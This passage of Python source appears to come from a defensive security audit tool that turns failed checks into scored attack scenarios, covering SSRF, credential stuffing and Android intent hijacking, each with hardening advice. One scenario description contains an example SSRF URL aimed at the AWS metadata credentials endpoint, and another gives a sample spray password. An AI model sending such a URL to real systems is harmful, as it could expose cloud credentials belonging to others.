        else:
            ssrf_active.append("No open redirection handlers detected in audit")

        if "BUG-WEB-002" in failed:
            ssrf_vulns.append(ContributingVulnerability(
                check_id="BUG-WEB-002",
                title="Unvalidated URL Input Fields",
                impact_penalty=-15.0,
                description="Forms permit arbitrary URL entry without validating scheme (blocking file://, gopher://) or verifying private IP ranges."
            ))
            ssrf_score -= 15.0
            ssrf_missing.append("Server-side URL parsing validating against RFC 1918 private IP ranges")
        else:
            ssrf_active.append("Input boundaries enforce strict semantic validation")

        ssrf_score = max(5.0, min(95.0, ssrf_score))
        results.append(cls._build_scenario(
            attack_id="ATK-INF-SSRF",
            name="Server-Side Request Forgery (SSRF) Attack",
            category="Cross-Platform & Infrastructure Threats",
            threat_objective="Abuse server-side functionality to forge requests to internal cloud metadata (AWS IMDS `169.254.169.254`), loopback services (`127.0.0.1:6379`), and private microservices.",
            vector_description=(
                "Adversary provides a crafted URL (e.g. `http://169.254.169.254/latest/meta-data/iam/security-credentials/`) to an application feature "
                "that fetches remote web resources (image processors, webhooks, PDF generators). If the server fetches without resolving and filtering, internal cloud tokens are exposed."
            ),
            survival_chance=ssrf_score,
            contributing_vulnerabilities=ssrf_vulns,
            mitigating_controls_active=ssrf_active,
            mitigating_controls_missing=ssrf_missing or ["Enforced IMDSv2 token validation on cloud instances and private IP egress filtering"],
            hardening_steps=[
                "Resolve remote hostnames to IP addresses before initiating HTTP requests, and discard connections to loopback (`127.0.0.0/8`) and private RFC 1918 subnets (`10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`).",
                "Require AWS IMDSv2 (`HttpTokens=required`) with a hop limit of 1 on all cloud compute instances to neutralize metadata extraction.",
                "Disable HTTP redirect following in backend HTTP client libraries (e.g. `follow_redirects=False`).",
                "Isolate backend worker tasks responsible for fetching untrusted media inside dedicated network namespaces with zero private network route access.",
            ]
        ))

        # ---------------------------------------------------------------------
        # 3. Credential Stuffing & Password Spraying (Bonus Threat)
        # ---------------------------------------------------------------------
        spray_vulns: List[ContributingVulnerability] = []
        spray_active: List[str] = []
        spray_missing: List[str] = []
        spray_score = 65.0

        if "WEB-028" in failed:
            spray_vulns.append(ContributingVulnerability(
                check_id="WEB-028",
                title="Missing Rate Limiting on Login / Authentication",
                impact_penalty=-30.0,
                description="Login portals lack request throttling, allowing automated credential stuffing tools to test millions of breached combinations."
            ))
            spray_score -= 30.0
            spray_missing.append("Adaptive authentication rate limiting and IP reputation filtering")
        else:
            spray_active.append("Rate limiting protections mitigate high-frequency credential stuffing")
            spray_score += 15.0

        if "WEB-010" in failed:
            spray_vulns.append(ContributingVulnerability(
                check_id="WEB-010",
                title="Administrative Routes Disclosed in robots.txt",
                impact_penalty=-10.0,
                description="Administrative management paths are publicly enumerated, directing credential spraying bots to high-value login targets."
            ))
            spray_score -= 10.0

        spray_score = max(5.0, min(95.0, spray_score))
        results.append(cls._build_scenario(
            attack_id="ATK-INF-BRUTE",
            name="Credential Stuffing & Password Spraying Attack",
            category="Cross-Platform & Infrastructure Threats",
            threat_objective="Hijack legitimate employee and administrative accounts by testing credentials leaked from third-party database breaches.",
            vector_description=(
                "Adversary inputs automated lists of username/password pairs harvested from external data breaches against login interfaces, "
                "or tests a single high-probability password (e.g. `Company2026!`) across thousands of corporate user accounts to avoid account lockout."
            ),
            survival_chance=spray_score,
            contributing_vulnerabilities=spray_vulns,
            mitigating_controls_active=spray_active,
            mitigating_controls_missing=spray_missing or ["Phishing-resistant Multi-Factor Authentication (FIDO2 / WebAuthn)"],
            hardening_steps=[
                "Mandate phishing-resistant Multi-Factor Authentication (MFA) via FIDO2 / WebAuthn hardware keys or authenticator apps for all users.",
                "Deploy proactive password screening (e.g. HaveIBeenPwned API) to reject passwords known to exist in compromised credential databases.",
                "Implement progressive delays, CAPTCHA challenges, and IP reputation throttling on repeated authentication failures.",
                "Enforce IP allowlisting or VPN requirements for administrative console endpoints.",
            ]
        ))

        return results

    # =========================================================================
    # 5. ANDROID MOBILE ATTACKS
    # =========================================================================

    @classmethod
    def _evaluate_apk_attacks(
        cls,
        failed: Dict[str, CheckFinding],
        passed: Dict[str, CheckFinding],
        ctx: Dict[str, Any],
    ) -> List[AttackScenarioResult]:
        results: List[AttackScenarioResult] = []

        # ---------------------------------------------------------------------
        # Android Component & Intent Hijacking
        # ---------------------------------------------------------------------
        apk_vulns: List[ContributingVulnerability] = []
        apk_active: List[str] = []
        apk_missing: List[str] = []
        apk_score = 65.0

        if "APK-004" in failed or "BUG-APK-004" in failed:
            apk_vulns.append(ContributingVulnerability(
                check_id="APK-004",
                title="Insecure Exported Application Components",
                impact_penalty=-35.0,
                description="Activities, services, or broadcast receivers are exported without permissions, allowing rogue apps on the device to fire malicious intents."
            ))
            apk_score -= 35.0
            apk_missing.append("android:exported='false' on internal application components")
        else:
            apk_active.append("All sensitive internal components explicitly non-exported")
            apk_score += 15.0

        if "APK-001" in failed:
            apk_vulns.append(ContributingVulnerability(
                check_id="APK-001",
                title="android:debuggable='true' in Release Manifest",
                impact_penalty=-35.0,
                description="Enables JDWP runtime debugger connection via USB/ADB, allowing attackers to inspect live memory and execute arbitrary code in app sandbox."
            ))
            apk_score -= 35.0
            apk_missing.append("android:debuggable='false' in release build variant")
        else:
            apk_active.append("Production release built with debuggable disabled")
            apk_score += 15.0

        if "APK-003" in failed:
            apk_vulns.append(ContributingVulnerability(
                check_id="APK-003",
                title="Cleartext HTTP Traffic Permitted",
                impact_penalty=-25.0,
                description="Permits unencrypted HTTP communication, exposing tokens and credentials to local Wi-Fi eavesdroppers."
            ))
            apk_score -= 25.0
            apk_missing.append("Cleartext traffic disabled (usesCleartextTraffic='false')")
        else:
            apk_active.append("Enforces TLS encryption for all mobile network traffic")
            apk_score += 10.0

        apk_score = max(5.0, min(95.0, apk_score))
        results.append(cls._build_scenario(
            attack_id="ATK-APK-HIJACK",
            name="Android Intent Hijacking & Local Sandbox Bypass",
            category="Android Mobile Security Threats",
            threat_objective="Bypass login activities, trigger internal background services, extract cached tokens from SharedPreferences, or dump runtime memory via JDWP.",
            vector_description=(
                "Malicious co-located applications installed on the Android device send implicit intents or crafted intent extras to exported activities. "
                "If components fail to validate calling package identities or enforce custom signature permissions, the unauthorized actions succeed."
            ),
            survival_chance=apk_score,
            contributing_vulnerabilities=apk_vulns,
            mitigating_controls_active=apk_active,
            mitigating_controls_missing=apk_missing,
            hardening_steps=[
                "Explicitly declare `android:exported='false'` on all activities, services, and broadcast receivers not required by the external OS.",
                "Protect unavoidable exported components using custom signature-level permissions (`android:protectionLevel='signature'`).",
                "Ensure `android:debuggable='false'` is strictly set in the release build flavor.",
                "Store sensitive authentication tokens in Android Keystore / EncryptedSharedPreferences rather than plaintext XML files.",
            ]
        ))

        return results

    # =========================================================================
    # HELPER BUILDERS
    # =========================================================================

    @classmethod
    def _build_scenario(
        cls,
        attack_id: str,
        name: str,
        category: str,
        threat_objective: str,
        vector_description: str,
        survival_chance: float,
        contributing_vulnerabilities: List[ContributingVulnerability],
        mitigating_controls_active: List[str],
        mitigating_controls_missing: List[str],
        hardening_steps: List[str],
    ) -> AttackScenarioResult:
        survival_chance = round(survival_chance, 1)

        if survival_chance >= 85.0:
            verdict = "Hardened Defense (Extremely High Survival Rate)"
            color = "#00FF66"  # Vibrant Neon Green
        elif survival_chance >= 65.0:
            verdict = "Strong Resilience (High Survival Rate)"
            color = "#00D4FF"  # Cyan
        elif survival_chance >= 45.0:
            verdict = "Moderate Resilience (Conditional Defense)"
            color = "#FFB800"  # Amber
        elif survival_chance >= 25.0:
            verdict = "Low Resilience (Severe Exploitation Exposure)"
            color = "#FF6B22"  # Orange
        else:
            verdict = "Critical Exposure (Near-Zero Survival Likelihood)"
            color = "#FF3366"  # Cyber Red

        return AttackScenarioResult(
            attack_id=attack_id,
            name=name,
            category=category,
            threat_objective=threat_objective,
            vector_description=vector_description,
            survival_chance=survival_chance,
            verdict=verdict,
            verdict_badge_color=color,
            contributing_vulnerabilities=contributing_vulnerabilities,
            mitigating_controls_active=mitigating_controls_active,
            mitigating_controls_missing=mitigating_controls_missing,
            hardening_steps=hardening_steps,
        )
